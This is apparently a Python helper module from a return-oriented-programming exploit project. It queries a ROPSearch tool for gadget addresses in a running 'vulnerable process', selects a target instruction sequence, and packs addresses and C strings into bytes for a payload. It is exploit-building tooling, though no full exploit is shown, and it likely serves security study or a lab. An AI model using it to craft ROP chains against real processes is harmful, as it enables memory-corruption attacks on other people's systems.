import os, sys
import subprocess
import collections


InstructionSequence = collections.namedtuple('InstructionSequence', 'vmAddress assemblyString')


def changeCWDToScriptDirectory():
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)

def runSubprocess(args):
    return subprocess.check_output(args, stderr=subprocess.STDOUT, text=True)

def stringIsHexNumber(string):
    try:
        _ = int(string, 16)
        return True
    except:
        return False

def getInstructionSequenceOutput(vulnerableProcessName):
    ropSearchPath = '../bin/ROPSearch.exe'
    vulnerableProcessPid = runSubprocess(['pidof', vulnerableProcessName]).strip()

    args = [
        ropSearchPath,
        'list',
        '-pid',
        vulnerableProcessPid,
    ]
    output = runSubprocess(args)

    lines = output.split(sep='\n')
    if len(lines) == 0:
        print(f'Found empty output when looking for instruction sequences in "{vulnerableProcessName}"')
        sys.exit(-1)

    instrSequences = []
    for line in lines:
        parts = line.split(': ', maxsplit=1)
        if len(parts) == 2 and stringIsHexNumber(parts[0]):
            virtualMemoryAddress = parts[0]
            assemblyString = parts[1]
            iSeq = InstructionSequence(virtualMemoryAddress, assemblyString)
            instrSequences.append(iSeq)

    return instrSequences

def findInstructionSequenceAddress(instrSequences, targetInstrSeqString):
    usefulInstrSequences = [iSeq for iSeq in instrSequences if iSeq.assemblyString == targetInstrSeqString]
    if len(usefulInstrSequences) == 0:
        print(f'The output doesn\'t have the target instruction sequence: {targetInstrSeqString}')
        sys.exit(-1)

    virtualAddress = usefulInstrSequences[0].vmAddress
    print(f'{virtualAddress}: "{targetInstrSeqString}"')

    virtualAddress = int(virtualAddress, 16)
    virtualAddressBytes = virtualAddress.to_bytes(8, 'little')
    return virtualAddressBytes

def convertStringToCStringBytes(string):
    return bytes(string, 'utf-8') + b'\x00'
